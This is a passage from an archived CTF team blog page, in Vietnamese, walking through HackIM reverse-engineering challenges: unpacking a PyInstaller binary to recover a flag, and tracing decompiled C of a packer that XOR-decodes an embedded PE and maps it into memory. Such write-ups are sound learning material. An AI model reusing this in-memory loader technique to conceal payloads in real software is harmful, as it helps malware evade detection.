@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7" lang="en-US">
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8" lang="en-US">
+<![endif]-->
+<!--[if !(IE 7) & !(IE 8)]><!-->
+<html lang="en-US">
+<!--<![endif]-->
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width">
+	<title>January | 2015 | BabyPhD CTF Team</title>
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+	<link rel="pingback" href="https://babyphd.net/xmlrpc.php">
+	<!--[if lt IE 9]>
+	<script src="https://babyphd.net/wp-content/themes/twentythirteen/js/html5.js"></script>
+	<![endif]-->
+	<script type='text/javascript'>function ctSetCookie(c_name, value, def_value){document.cookie = c_name + '=' + escape(value) + '; path=/';}ctSetCookie('ct_checkjs', '1181016728', '0');</script><link rel='dns-prefetch' href='https://s0.wp.com/' />
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Feed" href="../../feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="BabyPhD CTF Team &raquo; Comments Feed" href="../../comments/feed/index.html" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/babyphd.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.2.2.css' type='text/css' media='all' />
+<link rel='stylesheet' id='twentythirteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='../../wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css%3Fver=3.1.css' type='text/css' media='all' />
+<link rel='stylesheet' id='twentythirteen-style-css'  href='../../wp-content/themes/twentythirteen/style.css%3Fver=2013-07-18.css' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentythirteen-ie-css'  href='https://babyphd.net/wp-content/themes/twentythirteen/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
+<![endif]-->
+<link rel='stylesheet' id='jetpack_css-css'  href='../../wp-content/plugins/jetpack/css/jetpack.css%3Fver=7.5.2.css' type='text/css' media='all' />
+<script type='text/javascript' src='../../wp-includes/js/jquery/jquery.js%3Fver=1.12.4-wp'></script>
+<script type='text/javascript' src='../../wp-includes/js/jquery/jquery-migrate.min.js%3Fver=1.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ctPublic = {"_ajax_nonce":"a204603c59","_ajax_url":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../wp-content/plugins/cleantalk-spam-protect/js/apbct-public.min.js%3Fver=5.122'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ctNocache = {"ajaxurl":"https:\/\/babyphd.net\/wp-admin\/admin-ajax.php","info_flag":"","set_cookies_flag":"","blog_home":"https:\/\/babyphd.net\/"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='../../wp-content/plugins/cleantalk-spam-protect/js/cleantalk_nocache.min.js%3Fver=5.122'></script>
+<link rel='https://api.w.org/' href='../../wp-json/index.html' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../xmlrpc.php%3Frsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.2.2" />
+
+<link rel='dns-prefetch' href='https://v0.wordpress.com/'/>
+<link rel='dns-prefetch' href='https://i0.wp.com/'/>
+<link rel='dns-prefetch' href='https://i1.wp.com/'/>
+<link rel='dns-prefetch' href='https://i2.wp.com/'/>
+<style type='text/css'>img#wpstats{display:none}</style>		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+			<style type="text/css" id="twentythirteen-header-css">
+			.site-header {
+			background: url(../../wp-content/themes/twentythirteen/images/headers/star.png) no-repeat scroll top;
+			background-size: 1600px auto;
+		}
+		@media (max-width: 767px) {
+			.site-header {
+				background-size: 768px auto;
+			}
+		}
+		@media (max-width: 359px) {
+			.site-header {
+				background-size: 360px auto;
+			}
+		}
+		</style>
+				<style type="text/css" id="wp-custom-css">
+				code {
+    padding: 2px 4px;
+    margin: 0;
+    border-radius: 2px;
+    color: #222;
+    background: #f2f4f5;
+}			</style>
+		</head>
+
+<body class="archive date sidebar">
+	<div id="page" class="hfeed site">
+		<header id="masthead" class="site-header" role="banner">
+			<a class="home-link" href="../../index.html" title="BabyPhD CTF Team" rel="home">
+				<h1 class="site-title">BabyPhD CTF Team</h1>
+				<h2 class="site-description">Nói chung đây là một khái niệm vô cùng trừu tượng</h2>
+			</a>
+
+			<div id="navbar" class="navbar">
+				<nav id="site-navigation" class="navigation main-navigation" role="navigation">
+					<button class="menu-toggle">Menu</button>
+					<a class="screen-reader-text skip-link" href="index.html#content" title="Skip to content">Skip to content</a>
+					<div id="primary-menu" class="nav-menu"><ul>
+<li class="page_item page-item-2"><a href="../../ctf-wtf/index.html">CTF</a></li>
+</ul></div>
+					<form role="search" method="get" class="search-form" action="../../index.html">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form>				</nav><!-- #site-navigation -->
+			</div><!-- #navbar -->
+		</header><!-- #masthead -->
+
+		<div id="main" class="site-main">
+
+	<div id="primary" class="content-area">
+		<div id="content" class="site-content" role="main">
+
+					<header class="archive-header">
+				<h1 class="archive-title">Monthly Archives: January 2015</h1>
+			</header><!-- .archive-header -->
+
+										
+<article id="post-259" class="post-259 post type-post status-publish format-standard hentry category-pwn category-re category-uncategorized tag-list-linked tag-pwn tag-re tag-side-channel">
+	<header class="entry-header">
+		
+				<h1 class="entry-title">
+			<a href="13/hackim-2014-re-pwn-mentalnote/index.html" rel="bookmark">[HackIM 2014] RE + Pwn MentalNote</a>
+		</h1>
+		
+		<div class="entry-meta">
+			<span class="date"><a href="13/hackim-2014-re-pwn-mentalnote/index.html" title="Permalink to [HackIM 2014] RE + Pwn MentalNote" rel="bookmark"><time class="entry-date" datetime="2015-01-13T01:58:34+00:00">January 13, 2015</time></a></span><span class="categories-links"><a href="../../category/pwn/index.html" rel="category tag">pwn</a>, <a href="../../category/re/index.html" rel="category tag">re</a>, <a href="../../category/uncategorized/index.html" rel="category tag">Uncategorized</a></span><span class="tags-links"><a href="../../tag/list-linked/index.html" rel="tag">list-linked</a>, <a href="../../tag/pwn/index.html" rel="tag">pwn</a>, <a href="../../tag/re/index.html" rel="tag">re</a>, <a href="../../tag/side-channel/index.html" rel="tag">side-channel</a></span><span class="author vcard"><a class="url fn n" href="../../author/chim/index.html" title="View all posts by Trí Chim Trích" rel="author">Trí Chim Trích</a></span>					</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+		<div class="entry-content">
+		<h2><span style="color: #3366ff;">RE 100 - boo</span></h2>
+<p>binary khá nặng</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;trid boo
+
+TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello
+
+Collecting data from file: boo
+100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1)</pre>
+<p>=&gt; Mac OS Binary kernel Mach 64 bit</p>
+<p>Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;upx -d boo
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2013
+UPX 3.91w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+upx: boo: NotPackedException: not packed by UPX
+
+Unpacked 0 files.</pre>
+<p>Failed!</p>
+<p>Check lại string lần nữa để ý thấy cái zlib.so, struct.so, python ME... nghi ngờ thể loại python-&gt;bin quá.</p>
+<p>Find header PYZ =&gt; founded :yolo:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?ssl=1"><img data-attachment-id="262" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/boo_3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=608%2C72&amp;ssl=1" data-orig-size="608,72" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boo_3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=300%2C36&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=604%2C72&amp;ssl=1" class="alignnone size-full wp-image-262" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=604%2C72&#038;ssl=1" alt="boo_3" width="604" height="72" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?w=608&amp;ssl=1 608w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=300%2C36&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Ok easy roài, extract data python ra thôi - <a title="Link" href="http://reverseengineering.stackexchange.com/questions/160/how-do-you-reverse-engineer-an-exe-compiled-with-pyinstaller" target="_blank">Link</a></p>
+<pre class="lang:python decode:true ">import sys
+
+if len(sys.argv) == 13:
+	print "Great: flag{g3771ng_st4rt3d_2015}"
+else:
+	print "."</pre>
+<p>-------------------------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 200 - upx.exe</span></h2>
+<p>string thử chả thấy cái UPX! signature nào @@. decompress lại cho chắc failed nốt.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?ssl=1"><img data-attachment-id="263" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=631%2C125&amp;ssl=1" data-orig-size="631,125" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=300%2C59&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=604%2C120&amp;ssl=1" class="alignnone size-full wp-image-263" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=604%2C120&#038;ssl=1" alt="upx_1" width="604" height="120" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?w=631&amp;ssl=1 631w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=300%2C59&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Run</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?ssl=1"><img data-attachment-id="264" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-orig-size="176,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" class="alignnone size-full wp-image-264" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?resize=176%2C153&#038;ssl=1" alt="upx_2" width="176" height="153" data-recalc-dims="1" /></a></p>
+<p><em>OK boy let's make it nicely!</em></p>
+<p>Bật IDA Disass thấy đây là 1 binary MS C++ bình thường.</p>
+<p>main là winMain -&gt; sau đó call hàm sub_4001000</p>
+<pre class="height-set:true lang:c decode:true">int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
+{
+    sub_401000();
+    return 0;
+}
+
+void *__cdecl sub_401000()
+{
+    void *result; // eax@1
+    void *MZ_header; // ecx@1
+    int v2; // ecx@4
+    int v3; // ebp@4
+    int v4; // esi@4
+    int v5; // ebx@4
+    const char *v6; // edi@5
+    unsigned int v7; // edi@9
+    int v8; // ebx@9
+    HANDLE v9; // eax@9
+    void *v10; // esi@9
+    unsigned int v11; // eax@10
+    HANDLE v12; // eax@12
+    int v13; // ebx@12
+    SIZE_T v14; // [sp+0h] [bp-28h]@1
+    int v15; // [sp+4h] [bp-24h]@14
+    int v16; // [sp+8h] [bp-20h]@14
+    int v17; // [sp+Ch] [bp-1Ch]@14
+    int v18; // [sp+10h] [bp-18h]@14
+    int v19; // [sp+14h] [bp-14h]@14
+    SIZE_T v20; // [sp+18h] [bp-10h]@14
+    int v21; // [sp+1Ch] [bp-Ch]@14
+    int v22; // [sp+20h] [bp-8h]@14
+    int v23; // [sp+24h] [bp-4h]@14
+
+    result = GetModuleHandleW(0);
+    MZ_header = result;
+    v14 = (SIZE_T)result;
+    if ( result )
+    {
+        result = (void *)'ZM';
+        if ( *(_WORD *)MZ_header == 'ZM' )
+        {
+            result = (char *)MZ_header + *((_DWORD *)MZ_header + 15);
+            if ( *(_DWORD *)result == 'EP' )
+            {
+                v2 = *((_WORD *)result + 10);
+                v3 = *((_WORD *)result + 3);
+                v4 = 0;
+                v5 = (int)((char *)result + v2 + 24);
+                if ( v3 &gt; 0 )
+                {
+                    v6 = (char *)result + v2 + 24;
+                    while ( 1 )
+                    {
+                        result = (void *)strcmp(v6, ".reloc");
+                        if ( !result )
+                            break;
+                        ++v4;
+                        v6 += 40;
+                        if ( v4 &gt;= v3 )
+                            return result;
+                    }
+                    v7 = *(_DWORD *)(v5 + 40 * v4 + 16);
+                    v8 = v5 + 40 * v4;
+                    v9 = GetProcessHeap();
+                    result = HeapAlloc(v9, 8u, v7 + 1);
+                    v10 = result;
+                    if ( result )
+                    {                                           // malloc, copy hex sang cho malloc 6600
+                        unknown_libname_41(result, v14 + *(_DWORD *)(v8 + 12), *(_DWORD *)(v8 + 16));
+                        v11 = 0;
+                        if ( v7 )
+                        {
+                            do
+                                *((_BYTE *)v10 + v11++) ^= 0x11u;
+                            while ( v11 &lt; v7 );
+                        }
+                        v14 = *(_DWORD *)v10;
+                        v12 = GetProcessHeap();
+                        result = HeapAlloc(v12, 8u, v14);
+                        v13 = (int)result;
+                        if ( result )
+                        {
+                            result = (void *)sub_406660((int)((char *)v10 + 4), (int)result, v7 - 4, (int)&amp;v14);
+                            if ( !result )
+                            {
+                                v18 = 0;
+                                v15 = 0;
+                                v16 = 0;
+                                v17 = 0;
+                                v21 = 0;
+                                v22 = 0;
+                                v23 = 0;
+                                v20 = v14;
+                                v19 = v13;
+                                LOBYTE(v18) = 1;
+                                sub_401B60((int)&amp;v15);
+                                ExitProcess(1u);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return result;
+}</pre>
+<p>đầu tiên nó gọi hàm getModuleHandle để tìm base address của MZ Header<br />
+sau đó check MZ signature và PE signature ::for sure::</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?ssl=1"><img data-attachment-id="265" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" data-orig-size="307,254" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=300%2C248&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" class="alignnone size-full wp-image-265" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=307%2C254&#038;ssl=1" alt="upx_3" width="307" height="254" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?w=307&amp;ssl=1 307w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=300%2C248&amp;ssl=1 300w" sizes="(max-width: 307px) 100vw, 307px" data-recalc-dims="1" /></a></p>
+<p>find session .alloc</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?ssl=1"><img data-attachment-id="266" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" data-orig-size="347,199" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_4" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=300%2C172&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" class="alignnone size-full wp-image-266" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=347%2C199&#038;ssl=1" alt="upx_4" width="347" height="199" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?w=347&amp;ssl=1 347w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=300%2C172&amp;ssl=1 300w" sizes="(max-width: 347px) 100vw, 347px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?ssl=1"><img data-attachment-id="268" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=609%2C35&amp;ssl=1" data-orig-size="609,35" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_6" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=300%2C17&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=604%2C35&amp;ssl=1" class="alignnone size-full wp-image-268" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=604%2C35&#038;ssl=1" alt="upx_6" width="604" height="35" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?w=609&amp;ssl=1 609w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=300%2C17&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">var A = heapalloc(0x6600)</pre>
+<p>đến đoạn unknown_libname_41 này vì mình rất ghét cái gì cứ dấu giếm, và 1 phần nhác trỗi dậy. function thông thường của mscrt thôi nên xem các tham số truyền vô và kết quả trả về để đoán vậy (memcpy)</p>
+<pre class="lang:default decode:true">memcpy(0x41b00, A, 0x6600)
+for i in range(0x6600):
+	A[i] ^= 0x11</pre>
+<p>*một đoạn memory khá dài, lại còn bị mã hóa nữa. không thể nào là flag cipher được? Có lẽ nào là shellcode?</p>
+<pre class="lang:default decode:true">new_size = *(dword*)A = 0xbe00
+var B = heapalloc(new_size)
+sub_406660( &amp;new_size ) =&gt; copy MZ_Header -&gt; đến B, size = 0xbe00</pre>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?ssl=1"><img data-attachment-id="267" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" data-orig-size="468,132" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_5" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" class="alignnone size-full wp-image-267" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=468%2C132&#038;ssl=1" alt="upx_5" width="468" height="132" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?w=468&amp;ssl=1 468w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1" /></a></p>
+<p>Từ đây ta nhảy vào sub func cuối là sub_401b60</p>
+<p>Check các sub phụ, để ý các string mình thấy rất là liên quan</p>
+<pre class="lang:default decode:true">[+] Mapping PE file
+[+] Creating Map View of File
+[+] Map View of File created
+[+] Checking for self relocation
+[+] MyBase, MySize ?!?
+[+] Jumping to relocated image
+[+] Processing IAT
+[+] Loading Library and processing
+[+] Fixing Image Base address in PEB
+[+] Executing Entry Point !!!</pre>
+<p>và 1 số function khá vãi</p>
+<pre class="lang:default decode:true ">- CreateFileMappingW
+- MapViewOfFile
+- VirtualAlloc
+- GetProcAddress
+- VirtualQuery
+- LoadLibraryA
+- VirtualProtect</pre>
+<p>oke, tít đi ít! run shellcode chắc roài ::bem::</p>
+<p>ta đặt breakpoint ở ngay các sub con và run lần lượt đến khi nào shell được chạy thì phát hiện điểm G</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?ssl=1"><img data-attachment-id="269" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_7/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" data-orig-size="413,56" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_7" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=300%2C41&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" class="alignnone size-full wp-image-269" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=413%2C56&#038;ssl=1" alt="upx_7" width="413" height="56" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?w=413&amp;ssl=1 413w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=300%2C41&amp;ssl=1 300w" sizes="(max-width: 413px) 100vw, 413px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">sub_401b60 -&gt; sub_401600 -&gt; call eax
+new entry point =  08001563</pre>
+<p>sài HxD (hex editor) view ram process upx.exe tại địa chỉ đó thì thấy nguyên session từ 0x08000000 -&gt; 0x0800FFFF là 1 file PE mới,</p>
